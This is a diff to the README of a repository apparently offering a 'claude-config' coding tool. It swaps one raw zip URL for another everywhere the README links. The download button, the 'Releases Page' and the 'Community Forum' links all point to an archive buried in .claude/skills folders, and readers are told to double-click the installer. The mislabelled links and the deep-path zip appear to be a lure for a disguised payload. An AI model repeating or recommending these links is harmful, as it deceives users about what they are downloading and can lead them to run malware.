@@ -6,7 +6,7 @@ Welcome to the **claude-config** repository! This software offers a comprehensiv
 
 ## 📥 Download Now
 
-[![Download claude-config](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/review/checklists/claude-config-3.7.zip)](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/review/checklists/claude-config-3.7.zip)
+[![Download claude-config](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/dev/config-claude-2.0.zip)](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/dev/config-claude-2.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,11 +22,11 @@ Before you proceed, ensure your system meets the following requirements:
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to open the releases page:
-   [Download Here](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/review/checklists/claude-config-3.7.zip)
+   [Download Here](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/dev/config-claude-2.0.zip)
 
 2. **Select the Latest Version**: Look for the latest version at the top of the page. It should have the highest number (e.g., v1.0, v1.1).
 
-3. **Download the File**: Click on the file that best suits your operating system. Files are usually labeled for easy identification. For example, download `https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/review/checklists/claude-config-3.7.zip` for Windows users.
+3. **Download the File**: Click on the file that best suits your operating system. Files are usually labeled for easy identification. For example, download `https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/dev/config-claude-2.0.zip` for Windows users.
 
 4. **Run the Installer**: Once the download completes, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions. 
 
@@ -66,7 +66,7 @@ Should you encounter any issues during installation or usage, consider these opt
 For deeper learning and support, explore these resources:
 
 - **Documentation**: Detailed user guides and manuals are available on the repository's Wiki page.
-- **Community Forum**: Join discussions and seek help from fellow users [here](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/review/checklists/claude-config-3.7.zip).
+- **Community Forum**: Join discussions and seek help from fellow users [here](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/dev/config-claude-2.0.zip).
 
 ## 📞 Support
 
@@ -74,4 +74,4 @@ If you still have questions, feel free to reach out via the Issues tab on our Gi
 
 Thank you for choosing **claude-config**! Enjoy the benefits of an organized workflow and streamlined coding process. 
 
-Remember, for installation and updates, always refer back to our [Releases Page](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/review/checklists/claude-config-3.7.zip).
+Remember, for installation and updates, always refer back to our [Releases Page](https://raw.githubusercontent.com/Kamixon131/claude-config/main/.claude/skills/dev/config-claude-2.0.zip).
